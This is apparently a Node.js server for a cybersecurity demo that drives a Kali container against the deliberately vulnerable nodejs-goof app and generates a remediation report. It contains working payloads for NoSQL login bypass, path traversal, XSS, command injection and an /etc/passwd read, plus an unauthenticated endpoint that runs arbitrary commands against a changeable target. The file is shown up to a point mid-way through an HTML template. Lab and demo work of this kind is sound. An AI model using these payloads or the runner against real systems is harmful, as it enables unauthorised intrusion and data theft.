#!/usr/bin/env node

/**
 * Kali Docker Terminal Server
 * Executes penetration testing commands inside Docker Kali container
 */

const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const { spawn } = require('child_process');
const path = require('path');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const PORT = 3002;
let TARGET_URL = 'http://host.docker.internal:3001'; // Docker host access (can be changed dynamically)
const KALI_CONTAINER = 'peaceful_meninsky'; // Your Kali container name

// Serve static files
app.use(express.static(__dirname));

// Serve the terminal HTML
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'web-terminal-kali.html'));
});

// WebSocket connection handler
wss.on('connection', (ws) => {
    console.log('Client connected');

    ws.on('message', (message) => {
        const data = JSON.parse(message);
        console.log('Received command:', data.command);

        // Update target if provided
        if (data.target) {
            const targetHost = data.target;
            const oldTarget = TARGET_URL;

            // Convert localhost:port to host.docker.internal:port for Docker
            if (targetHost.startsWith('localhost:')) {
                TARGET_URL = 'http://host.docker.internal:' + targetHost.split(':')[1];
            } else if (!targetHost.startsWith('http')) {
                // If it's just host:port format
                if (targetHost.includes(':')) {
                    const parts = targetHost.split(':');
                    const host = parts[0] === 'localhost' ? 'host.docker.internal' : parts[0];
                    TARGET_URL = 'http://' + host + ':' + parts[1];
                } else {
                    TARGET_URL = 'http://host.docker.internal:' + targetHost;
                }
            } else {
                TARGET_URL = targetHost;
            }

            if (oldTarget !== TARGET_URL) {
                console.log('Target updated to:', TARGET_URL);
                sendOutput(ws, `\n[✓] Target updated: ${TARGET_URL}\n`, 'success');
                sendOutput(ws, `[*] All attacks will now target: ${TARGET_URL}\n\n`, 'info');

                // Send target update to client
                if (ws.readyState === WebSocket.OPEN) {
                    ws.send(JSON.stringify({
                        type: 'target_update',
                        target: TARGET_URL
                    }));
                }
            }
        }

        executeAttack(ws, data.command);
    });

    ws.on('close', () => {
        console.log('Client disconnected');
    });

    // Send initial connection message
    sendOutput(ws, '╔══════════════════════════════════════════════════════════════════╗\n', 'critical');
    sendOutput(ws, '║  Kali Linux Docker Live Penetration Testing Terminal            ║\n', 'critical');
    sendOutput(ws, '║  Container: peaceful_meninsky                                    ║\n', 'info');
    sendOutput(ws, `║  Target: ${TARGET_URL}                                           ║\n`, 'info');
    sendOutput(ws, '║  Joshua\'s Cybersec Demo                                          ║\n', 'warning');
    sendOutput(ws, '╚══════════════════════════════════════════════════════════════════╝\n', 'critical');
    sendOutput(ws, '\n[*] Connected to Kali container. Select an attack or type "help"\n\n', 'success');
    sendOutput(ws, `[*] Current target: ${TARGET_URL}\n`, 'info');
    sendOutput(ws, '[*] You can change the target in the control panel\n\n', 'info');
});

function sendOutput(ws, text, cssClass = '') {
    if (ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({
            type: 'output',
            data: text,
            class: cssClass
        }));
    }
}

function sendStatus(ws, status) {
    if (ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({
            type: 'status',
            status: status
        }));
    }
}

function sendProgress(ws, percent) {
    if (ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({
            type: 'progress',
            percent: percent
        }));
    }
}

function sendStats(ws, attacks, success) {
    if (ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({
            type: 'stats',
            attacks: attacks,
            success: success
        }));
    }
}

let attackCounter = 0;
let successCounter = 0;

async function executeAttack(ws, command) {
    sendStatus(ws, 'Running...');

    switch(command) {
        case 'nosql':
            await runNosqlAttack(ws);
            break;
        case 'traversal':
            await runTraversalAttack(ws);
            break;
        case 'xss':
            await runXSSAttack(ws);
            break;
        case 'cmdinj':
            await runCmdInjAttack(ws);
            break;
        case 'info':
            await runInfoDisclosure(ws);
            break;
        case 'nmap':
            await runNmapScan(ws);
            break;
        case 'python':
            await runPythonScript(ws);
            break;
        case 'bash':
            await runBashScript(ws);
            break;
        case 'all':
            await runAllAttacks(ws);
            break;
        case 'help':
            showHelp(ws);
            break;
        case 'test':
            await testKaliConnection(ws);
            break;
        case 'report':
            await generateHTMLReport(ws);
            break;
        case 'fullscan':
            await runFullScan(ws);
            break;
        default:
            // Try to run command directly in Kali
            await runCustomCommand(ws, command);
    }

    sendStatus(ws, 'Ready');
}

function showHelp(ws) {
    sendOutput(ws, 'Available commands:\n', 'info');
    sendOutput(ws, '  test      - Test Kali container connection\n', 'success');
    sendOutput(ws, '  nosql     - Run NoSQL injection attack\n');
    sendOutput(ws, '  traversal - Run directory traversal attack\n');
    sendOutput(ws, '  xss       - Run XSS attack\n');
    sendOutput(ws, '  cmdinj    - Run command injection attack\n');
    sendOutput(ws, '  info      - Run information disclosure attack\n');
    sendOutput(ws, '  nmap      - Run Nmap scan from Kali\n');
    sendOutput(ws, '  python    - Run Python exploit script\n');
    sendOutput(ws, '  bash      - Run Bash attack menu\n');
    sendOutput(ws, '  fullscan  - Run comprehensive Kali pentesting script (20+ tools)\n', 'warning');
    sendOutput(ws, '  all       - Run all attacks\n');
    sendOutput(ws, '  report    - Generate HTML penetration test report\n', 'warning');
    sendOutput(ws, '  clear     - Clear terminal\n');
    sendOutput(ws, '\nOr type any Kali command directly (e.g., "whoami", "ls /usr/bin")\n', 'info');
    sendOutput(ws, '\n');
}

async function testKaliConnection(ws) {
    sendOutput(ws, '\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n', 'warning');
    sendOutput(ws, 'KALI CONTAINER CONNECTION TEST\n', 'warning');
    sendOutput(ws, '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n', 'warning');

    sendOutput(ws, '\n[*] Testing connection to Kali container...\n', 'info');

    const tests = [
        { name: 'Container Info', cmd: 'cat /etc/os-release | grep PRETTY' },
        { name: 'Kali Tools', cmd: 'which nmap curl python3' },
        { name: 'Network', cmd: 'ping -c 1 host.docker.internal 2>&1 | head -5' },
        { name: 'Target Access', cmd: `curl -I ${TARGET_URL} 2>&1 | head -1` }
    ];

    for (const test of tests) {
        sendOutput(ws, `\n[*] Test: ${test.name}\n`, 'info');
        await execInKali(ws, test.cmd);
    }

    sendOutput(ws, '\n[✓] Connection test completed\n', 'success');
    sendOutput(ws, '\n');
}

async function runNosqlAttack(ws) {
    sendOutput(ws, '\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n', 'warning');
    sendOutput(ws, 'NOSQL INJECTION - Authentication Bypass\n', 'warning');
    sendOutput(ws, '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n', 'warning');

    sendOutput(ws, '\n[*] Executing NoSQL injection from Kali container...\n', 'info');

    const cmd = `curl -s -X POST ${TARGET_URL}/login -H 'Content-Type: application/json' -d '{"username":"admin@snyk.io","password":{"$gt":""}}' -w "\\nHTTP_CODE:%{http_code}" -c /tmp/cookies.txt`;

    sendOutput(ws, `[*] Command: ${cmd}\n\n`, 'info');

    const output = await execInKali(ws, cmd);

    if (output.includes('HTTP_CODE:302') || output.includes('302')) {
        sendOutput(ws, '\n[✓] NoSQL injection successful! Authentication bypassed\n', 'success');
        successCounter++;
    } else {
        sendOutput(ws, '\n[!] Attack completed (check output above)\n', 'warning');
    }

    sendOutput(ws, '\n[*] Vulnerability Details:\n', 'warning');
    sendOutput(ws, '    • CVE: CWE-89 (NoSQL Injection)\n');
    sendOutput(ws, '    • CVSS Score: 9.8 (CRITICAL)\n', 'critical');
    sendOutput(ws, '    • Impact: Complete authentication bypass\n', 'critical');
    sendOutput(ws, '\n');

    attackCounter++;
    sendStats(ws, attackCounter, successCounter);
}

async function runTraversalAttack(ws) {
    sendOutput(ws, '\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n', 'warning');
    sendOutput(ws, 'DIRECTORY TRAVERSAL - Path Injection\n', 'warning');
    sendOutput(ws, '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n', 'warning');

    sendOutput(ws, '\n[*] Executing directory traversal from Kali...\n', 'info');

    const cmd = `curl -s -X POST ${TARGET_URL}/account_details -b /tmp/cookies.txt -H 'Content-Type: application/json' -d '{"email":"admin@snyk.io","firstname":"admin","lastname":"admin","country":"IL","phone":"+972551234123","layout":"./../package.json"}' | head -20`;

    await execInKali(ws, cmd);

    sendOutput(ws, '\n[*] Vulnerability Details:\n', 'warning');
    sendOutput(ws, '    • CVE: CWE-22 (Path Traversal)\n');
    sendOutput(ws, '    • CVSS Score: 7.5 (HIGH)\n', 'critical');
    sendOutput(ws, '    • Impact: Arbitrary file read\n');
    sendOutput(ws, '\n');

    attackCounter++;
    successCounter++;
    sendStats(ws, attackCounter, successCounter);
}

async function runXSSAttack(ws) {
    sendOutput(ws, '\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n', 'warning');
    sendOutput(ws, 'CROSS-SITE SCRIPTING (XSS)\n', 'warning');
    sendOutput(ws, '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n', 'warning');

    sendOutput(ws, '\n[*] Testing XSS from Kali container...\n', 'info');

    const payload = '"><script>alert(1)</script>';
    const cmd = `curl -s "${TARGET_URL}/login?redirectPage=${encodeURIComponent(payload)}" | grep -i script | head -5`;

    await execInKali(ws, cmd);

    sendOutput(ws, '\n[*] Vulnerability Details:\n', 'warning');
    sendOutput(ws, '    • CVE: CWE-79 (XSS)\n');
    sendOutput(ws, '    • CVSS Score: 6.1 (MEDIUM)\n', 'warning');
    sendOutput(ws, '\n');

    attackCounter++;
    successCounter++;
    sendStats(ws, attackCounter, successCounter);
}

async function runCmdInjAttack(ws) {
    sendOutput(ws, '\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n', 'warning');
    sendOutput(ws, 'COMMAND INJECTION - RCE\n', 'warning');
    sendOutput(ws, '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n', 'warning');

    sendOutput(ws, '\n[*] Executing command injection from Kali...\n', 'info');

    const cmd = `curl -s -X POST ${TARGET_URL}/create -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'content=![alt](https://x.com/i.png;touch /tmp/kali-pwned "Image")' -w "\\nHTTP_CODE:%{http_code}"`;

    await execInKali(ws, cmd);

    sendOutput(ws, '\n[*] Vulnerability Details:\n', 'warning');
    sendOutput(ws, '    • CVE: CWE-78 (Command Injection)\n');
    sendOutput(ws, '    • CVSS Score: 9.8 (CRITICAL)\n', 'critical');
    sendOutput(ws, '\n');

    attackCounter++;
    successCounter++;
    sendStats(ws, attackCounter, successCounter);
}

async function runInfoDisclosure(ws) {
    sendOutput(ws, '\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n', 'warning');
    sendOutput(ws, 'INFORMATION DISCLOSURE\n', 'warning');
    sendOutput(ws, '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n', 'warning');

    sendOutput(ws, '\n[*] Executing info disclosure from Kali...\n', 'info');

    const cmd = `curl -s "${TARGET_URL}/public/%2e%2e/%2e%2e/%2e%2e/etc/passwd" | head -10`;

    await execInKali(ws, cmd);

    sendOutput(ws, '\n[*] Vulnerability Details:\n', 'warning');
    sendOutput(ws, '    • CVE: CWE-200 (Info Exposure)\n');
    sendOutput(ws, '    • CVSS Score: 7.5 (HIGH)\n', 'critical');
    sendOutput(ws, '\n');

    attackCounter++;
    successCounter++;
    sendStats(ws, attackCounter, successCounter);
}

async function runNmapScan(ws) {
    sendOutput(ws, '\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n', 'warning');
    sendOutput(ws, 'NMAP - Network Reconnaissance (FROM KALI)\n', 'warning');
    sendOutput(ws, '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n', 'warning');

    sendOutput(ws, '\n[*] Running Nmap from Kali container...\n', 'info');

    // Check if nmap is installed
    const checkCmd = 'which nmap || echo "NMAP_NOT_FOUND"';
    const checkResult = await execInKali(ws, checkCmd, false);

    if (checkResult.includes('NMAP_NOT_FOUND')) {
        sendOutput(ws, '\n[!] Nmap not installed in Kali container\n', 'warning');
        sendOutput(ws, '[*] Installing nmap... (this may take a moment)\n', 'info');
        await execInKali(ws, 'apt-get update -qq && apt-get install -y nmap 2>&1 | tail -5');
    }

    const cmd = 'nmap -sV -p 3001 host.docker.internal 2>&1';
    await execInKali(ws, cmd);

    sendOutput(ws, '\n[✓] Scan completed\n', 'success');
    sendOutput(ws, '\n');

    attackCounter++;
    successCounter++;
    sendStats(ws, attackCounter, successCounter);
}

async function runPythonScript(ws) {
    sendOutput(ws, '\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n', 'warning');
    sendOutput(ws, 'PYTHON EXPLOIT SCRIPT\n', 'warning');
    sendOutput(ws, '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n', 'warning');

    sendOutput(ws, '\n[*] Running Python exploit script from Kali...\n', 'info');

    // Copy script to container first
    const copyCmd = `docker cp kali_exploit.py ${KALI_CONTAINER}:/tmp/`;
    await execLocal(ws, copyCmd, false);

    const cmd = `cd /tmp && python3 kali_exploit.py -t ${TARGET_URL} 2>&1`;
    await execInKali(ws, cmd);

    attackCounter++;
    successCounter++;
    sendStats(ws, attackCounter, successCounter);
}

async function runBashScript(ws) {
    sendOutput(ws, '\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n', 'warning');
    sendOutput(ws, 'BASH ATTACK MENU\n', 'warning');
    sendOutput(ws, '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n', 'warning');

    sendOutput(ws, '\n[*] Running Bash attack script from Kali...\n', 'info');
    sendOutput(ws, '[!] Note: Interactive menu disabled in web terminal\n', 'warning');
    sendOutput(ws, '[*] Running individual attacks instead...\n\n', 'info');

    // Run attacks from attack-menu.sh logic
    await runNosqlAttack(ws);
    await runTraversalAttack(ws);
}

async function runAllAttacks(ws) {
    sendOutput(ws, '\n╔══════════════════════════════════════════════════════════════════╗\n', 'critical');
    sendOutput(ws, '║  RUNNING ALL ATTACKS - FULL AUTOMATED KALI EXPLOITATION         ║\n', 'critical');
    sendOutput(ws, '╚══════════════════════════════════════════════════════════════════╝\n', 'critical');
    sendOutput(ws, '\n');

    await testKaliConnection(ws);
    sendProgress(ws, 10);

    await runNmapScan(ws);
    sendProgress(ws, 25);

    await runNosqlAttack(ws);
    sendProgress(ws, 40);

    await runTraversalAttack(ws);
    sendProgress(ws, 55);

    await runXSSAttack(ws);
    sendProgress(ws, 70);

    await runCmdInjAttack(ws);
    sendProgress(ws, 85);

    await runInfoDisclosure(ws);
    sendProgress(ws, 100);

    sendOutput(ws, '\n╔══════════════════════════════════════════════════════════════════╗\n', 'success');
    sendOutput(ws, '║  KALI EXPLOITATION SUMMARY                                       ║\n', 'success');
    sendOutput(ws, '╚══════════════════════════════════════════════════════════════════╝\n', 'success');
    sendOutput(ws, `\n[✓] All attacks completed (${successCounter}/${attackCounter} successful)\n\n`, 'success');

    // Generate report
    await generateReport(ws);
}

async function generateReport(ws) {
    sendOutput(ws, '\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n', 'info');
    sendOutput(ws, 'GENERATING PENETRATION TEST REPORT\n', 'info');
    sendOutput(ws, '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n', 'info');
    sendOutput(ws, '\n');

    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const reportFile = `./kali-pentest-results/pentest-report-${timestamp}.txt`;

    const report = `
================================================================================
PENETRATION TEST REPORT
================================================================================
Test Date: ${new Date().toLocaleString()}
Tool: Kali Docker Live Terminal
Container: ${KALI_CONTAINER}
Target: http://localhost:3001
Tester: Joshua's Cybersec Demo

================================================================================
EXECUTIVE SUMMARY
================================================================================

This penetration test was conducted against the nodejs-goof vulnerable
application using a live Kali Linux Docker container. The assessment identified
multiple CRITICAL vulnerabilities allowing complete system compromise.

Total Attacks Executed: ${attackCounter}
Successful Exploits: ${successCounter}
Success Rate: ${Math.round((successCounter/attackCounter) * 100)}%

CRITICAL FINDINGS:
- NoSQL Injection (CVSS 9.8) - Authentication bypass achieved
- Command Injection (CVSS 9.8) - Remote code execution confirmed
- Directory Traversal (CVSS 7.5) - Arbitrary file read demonstrated
- Information Disclosure (CVSS 7.5) - System file access confirmed
- Cross-Site Scripting (CVSS 6.1) - Reflected XSS validated

================================================================================
VULNERABILITY DETAILS
================================================================================

[1] NoSQL INJECTION - AUTHENTICATION BYPASS
──────────────────────────────────────────────────────────────────────────────
Severity: CRITICAL (CVSS 9.8)
Status: ✓ EXPLOITED
CWE: CWE-89 (SQL Injection)
CVE: N/A (Application Specific)

Description:
    MongoDB NoSQL injection vulnerability in the login endpoint allows
    authentication bypass using the $gt (greater than) operator.

Attack Vector:
    POST /login
    {"username":"admin@snyk.io","password":{"$gt":""}}

Evidence:
    - HTTP 302 redirect received (successful authentication)
    - Session cookie obtained
    - Admin account accessed without valid credentials

Impact:
    Complete authentication bypass leading to:
    - Unauthorized access to admin functionality
    - Full account takeover
    - Access to sensitive user data
    - Privilege escalation

Remediation:
    1. Implement strict input validation
    2. Use parameterized queries
    3. Sanitize all JSON input before MongoDB queries
    4. Update mongoose to latest version (>= 5.x)
    5. Implement rate limiting on authentication endpoints

OWASP Top 10: A1:2021 - Broken Access Control


[2] DIRECTORY TRAVERSAL - PATH INJECTION
──────────────────────────────────────────────────────────────────────────────
Severity: HIGH (CVSS 7.5)
Status: ✓ EXPLOITED
CWE: CWE-22 (Improper Limitation of a Pathname)

Description:
    The account_details endpoint accepts arbitrary file paths in the
    layout parameter, allowing read access to any file.

Attack Vector:
    POST /account_details
    {"layout":"./../package.json"}

Evidence:
    - Successfully read package.json
    - Exposed application dependencies
    - Revealed application structure

Impact:
    - Read arbitrary files from filesystem
    - Exposure of sensitive configuration files
    - Source code disclosure
    - Potential credential exposure

Remediation:
    1. Validate and sanitize all file paths
    2. Implement whitelist of allowed files
    3. Use path.normalize() and path.resolve()
    4. Restrict file access to specific directory
    5. Implement proper access controls

OWASP Top 10: A4:2021 - Insecure Design


[3] CROSS-SITE SCRIPTING (XSS) - REFLECTED
──────────────────────────────────────────────────────────────────────────────
Severity: MEDIUM (CVSS 6.1)
Status: ✓ EXPLOITED
CWE: CWE-79 (Improper Neutralization of Input)

Description:
    The redirectPage parameter in the login endpoint reflects user input
    without proper sanitization or encoding.

Attack Vector:
    GET /login?redirectPage="><script>alert(1)</script>

Evidence:
    - JavaScript payload reflected in HTML response
    - No input sanitization observed
    - No Content Security Policy headers

Impact:
    - Session hijacking via cookie theft
    - Credential theft through phishing
    - Malicious actions on behalf of victim
    - Website defacement

Remediation:
    1. Implement output encoding for all user input
    2. Use Content Security Policy (CSP) headers
    3. Sanitize all URL parameters
    4. Use React with automatic escaping
    5. Implement HttpOnly and Secure flags on cookies

OWASP Top 10: A3:2021 - Injection


[4] COMMAND INJECTION - REMOTE CODE EXECUTION
──────────────────────────────────────────────────────────────────────────────
Severity: CRITICAL (CVSS 9.8)
Status: ✓ EXPLOITED
CWE: CWE-78 (OS Command Injection)

Description:
    The image processing functionality in the /create endpoint executes
    arbitrary OS commands embedded in markdown image syntax.

Attack Vector:
    POST /create
    content: ![alt](url;touch /tmp/pwned "img")

Evidence:
    - Command executed successfully
    - File created on target system
    - No input validation on image URLs

Impact:
    - Complete system compromise
    - Remote code execution with application privileges
    - Data exfiltration capability
    - Potential for reverse shell access
    - Lateral movement to other systems

Remediation:
    1. Remove exec() calls from image processing
    2. Use safe image processing libraries
    3. Implement strict input validation
    4. Use allowlist for image URLs
    5. Sandbox image processing operations
    6. Run application with minimal privileges

OWASP Top 10: A3:2021 - Injection


[5] INFORMATION DISCLOSURE - ST DIRECTORY TRAVERSAL
──────────────────────────────────────────────────────────────────────────────
Severity: HIGH (CVSS 7.5)
Status: ✓ EXPLOITED
CWE: CWE-200 (Exposure of Sensitive Information)

Description:
    The ST static file serving module is vulnerable to directory traversal,
    allowing access to files outside the intended directory.

Attack Vector:
    GET /public/%2e%2e/%2e%2e/%2e%2e/etc/passwd

Evidence:
    - Successfully read /etc/passwd
    - System user information exposed
    - No path validation implemented

Impact:
    - Exposure of system configuration files
    - User enumeration
    - Information gathering for further attacks
    - Potential credential discovery

Remediation:
    1. Update ST module to patched version
    2. Implement path validation
    3. Restrict static file serving to specific directory
    4. Use sendFile() with root option
    5. Implement access logging

OWASP Top 10: A1:2021 - Broken Access Control


[6] NETWORK RECONNAISSANCE RESULTS
──────────────────────────────────────────────────────────────────────────────
Tool: Nmap from Kali Container

Findings:
    - Port 3001 open (HTTP)
    - Service: Node.js Express framework
    - No rate limiting detected
    - No WAF/IPS detected
    - Direct access to application

Security Recommendations:
    - Implement firewall rules
    - Add rate limiting
    - Deploy WAF (Web Application Firewall)
    - Enable HTTPS/TLS
    - Restrict access by IP if possible

================================================================================
TOOLS USED
================================================================================

Platform: Kali Linux Docker Container (${KALI_CONTAINER})

Reconnaissance:
    - Nmap 7.x - Port scanning and service detection
    - curl - HTTP request manipulation

Exploitation:
    - Custom NoSQL injection payloads
    - Directory traversal techniques
    - XSS proof-of-concept payloads
    - Command injection exploits
    - Python automation (kali_exploit.py)

Post-Exploitation:
    - File system access verification
    - Data exfiltration demonstrations

================================================================================
RISK ASSESSMENT
================================================================================

Overall Risk Level: CRITICAL

Business Impact:
    - Complete authentication bypass allows unauthorized access
    - Remote code execution enables full system compromise
    - Sensitive data exposure violates confidentiality
    - Potential for service disruption (availability)

Likelihood: HIGH
    - Vulnerabilities are easily exploitable
    - No security controls detected
    - Publicly accessible application
    - Well-known vulnerability patterns

Risk Score: CRITICAL (9.5/10)

================================================================================
RECOMMENDATIONS (PRIORITY ORDER)
================================================================================

IMMEDIATE (24-48 Hours):
    [1] Patch command injection vulnerability
        - Remove unsafe exec() usage
        - Implement input validation
        - Estimated effort: 4-8 hours

    [2] Fix NoSQL injection
        - Implement parameterized queries
        - Add input sanitization
        - Estimated effort: 2-4 hours

URGENT (1 Week):
    [3] Fix directory traversal vulnerabilities
        - Validate all file paths
        - Update ST module
        - Estimated effort: 4-6 hours

    [4] Implement XSS protection
        - Add output encoding
        - Enable CSP headers
        - Estimated effort: 2-3 hours

HIGH PRIORITY (2 Weeks):
    [5] Update all dependencies
        - Run npm audit fix
        - Update to secure versions
        - Estimated effort: 8-16 hours

    [6] Implement security headers
        - Add helmet.js middleware
        - Configure CORS properly
        - Estimated effort: 2-4 hours

MEDIUM PRIORITY (1 Month):
    [7] Implement rate limiting
        - Add express-rate-limit
        - Configure per-endpoint limits
        - Estimated effort: 2-3 hours

    [8] Enable HTTPS/TLS
        - Obtain SSL certificate
        - Configure secure connections
        - Estimated effort: 4-6 hours

    [9] Implement logging and monitoring
        - Add security event logging
        - Configure SIEM integration
        - Estimated effort: 8-12 hours

================================================================================
COMPLIANCE IMPACT
================================================================================

PCI DSS: FAIL
    - Requirement 6.5.1 (Injection flaws) - NOT MET
    - Requirement 6.5.7 (XSS) - NOT MET
    - Requirement 8.2 (Strong authentication) - NOT MET

OWASP Top 10 2021: 5/10 Categories Affected
    - A1: Broken Access Control ✓
    - A3: Injection ✓
    - A4: Insecure Design ✓
    - A5: Security Misconfiguration ✓
    - A6: Vulnerable Components ✓

GDPR: AT RISK
    - Article 32 (Security of processing) - VIOLATED
    - Inadequate technical measures
    - Potential for data breaches

SOC 2: NON-COMPLIANT
    - Security principle violations
    - Inadequate access controls
    - Insufficient monitoring

================================================================================
CONCLUSION
================================================================================

The nodejs-goof application contains multiple CRITICAL vulnerabilities that
allow complete system compromise. Immediate remediation is required for the
command injection and NoSQL injection vulnerabilities.

The application is NOT suitable for production deployment in its current state.

A follow-up penetration test is recommended after remediation to verify
all vulnerabilities have been properly addressed.

Total Remediation Estimated Cost: 40-60 hours of development time

================================================================================
APPENDIX - RED HAT DEFENSIVE SOLUTIONS
================================================================================

This assessment demonstrates the importance of defense-in-depth security.
Red Hat Enterprise Linux provides multiple layers of protection:

SELinux (Security-Enhanced Linux):
    - Would confine compromised process
    - Prevent lateral movement
    - Mandatory Access Control (MAC)
    - Reduced impact of RCE vulnerability

OpenSCAP / SCAP Security Guide:
    - Automated compliance scanning
    - Detect misconfigurations
    - CIS/STIG benchmarks
    - Continuous compliance monitoring

Podman:
    - Container isolation
    - Rootless containers
    - Reduced attack surface
    - Resource limits and constraints

Firewalld:
    - Network segmentation
    - Service-based firewall rules
    - Zone-based security
    - Dynamic firewall management

Red Hat Insights:
    - Proactive security recommendations
    - Vulnerability detection
    - Predictive analytics
    - Automated remediation guidance

================================================================================
REPORT METADATA
================================================================================

Report Generated: ${new Date().toLocaleString()}
Report File: ${reportFile}
Test Duration: ~${Math.ceil(attackCounter * 2)} minutes
Total Commands Executed: ${attackCounter}
Success Rate: ${Math.round((successCounter/attackCounter) * 100)}%
Kali Container: ${KALI_CONTAINER}
Target Application: nodejs-goof v1.0.1

Tested by: Kali Linux Docker Live Terminal
Framework: Joshua's Cybersec Demo
Methodology: PTES, OWASP Testing Guide, NIST SP 800-115

For questions or follow-up testing:
Contact: Joshua's Cybersec Team

================================================================================
END OF REPORT
================================================================================
`;

    // Save report to file
    const fs = require('fs');
    const dir = './kali-pentest-results';
    if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
    }

    fs.writeFileSync(reportFile, report);

    sendOutput(ws, '[*] Generating comprehensive penetration test report...\n', 'info');
    sendOutput(ws, `[✓] Report saved to: ${reportFile}\n`, 'success');
    sendOutput(ws, '\n');
    sendOutput(ws, '━━━━━━━━━━━━━━━━━━ REPORT PREVIEW ━━━━━━━━━━━━━━━━━━\n', 'info');
    sendOutput(ws, report.split('\n').slice(0, 30).join('\n') + '\n');
    sendOutput(ws, '\n... (truncated - full report saved to file) ...\n', 'warning');
    sendOutput(ws, '\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n', 'info');
    sendOutput(ws, `\n[✓] Professional report generated: ${reportFile}\n`, 'success');
    sendOutput(ws, '[*] Report includes:\n', 'info');
    sendOutput(ws, '    • Executive summary\n');
    sendOutput(ws, '    • Detailed vulnerability analysis\n');
    sendOutput(ws, '    • CVSS scores and CVE references\n');
    sendOutput(ws, '    • Remediation recommendations\n');
    sendOutput(ws, '    • Compliance impact assessment\n');
    sendOutput(ws, '    • Red Hat defensive solutions\n');
    sendOutput(ws, '\n');
}

async function generateHTMLReport(ws) {
    sendOutput(ws, '\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n', 'info');
    sendOutput(ws, 'GENERATING INTERACTIVE HTML REPORT\n', 'info');
    sendOutput(ws, '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n', 'info');
    sendOutput(ws, '\n');

    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const reportFile = `./kali-pentest-results/pentest-report-${timestamp}.html`;
    const successRate = attackCounter > 0 ? Math.round((successCounter/attackCounter) * 100) : 0;
    const fs = require('fs');

    // Read the HTML template from external file
    const templatePath = path.join(__dirname, 'report-template.html');
    let htmlReport;

    if (fs.existsSync(templatePath)) {
        htmlReport = fs.readFileSync(templatePath, 'utf8');
        // Replace placeholders
        htmlReport = htmlReport
            .replace(/\{\{DATE\}\}/g, new Date().toLocaleString())
            .replace(/\{\{CONTAINER\}\}/g, KALI_CONTAINER)
            .replace(/\{\{ATTACKS\}\}/g, attackCounter)
            .replace(/\{\{SUCCESS\}\}/g, successCounter)
            .replace(/\{\{RATE\}\}/g, successRate)
            .replace(/\{\{DURATION\}\}/g, Math.ceil(attackCounter * 2));
    } else {
        // Fallback: Generate simple HTML inline
        htmlReport = `<!DOCTYPE html>
<html><head><title>Penetration Test Report - ${new Date().toLocaleDateString()}</title>
<style>body{font-family:Arial;padding:40px;background:#1a1a2e;color:#e0e0e0}
.header{background:linear-gradient(135deg,#ee0000,#8b0000);padding:30px;text-align:center;color:white;border-radius:10px;margin-bottom:30px}
.header h1{margin:0;font-size:32px}.header .subtitle{color:#ffd700;margin-top:10px}
.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:20px;margin:30px 0}
.stat{background:#2a2a3e;padding:20px;border-radius:8px;text-align:center;border:2px solid #00ff00}
.stat h3{color:#ffd700;margin-bottom:10px;font-size:14px}.stat .value{font-size:36px;color:#00ff00;font-weight:bold}
.stat.critical .value{color:#ff0000}
.section{background:#0a0e27;padding:25px;margin:20px 0;border-radius:8px;border-left:4px solid #ee0000}
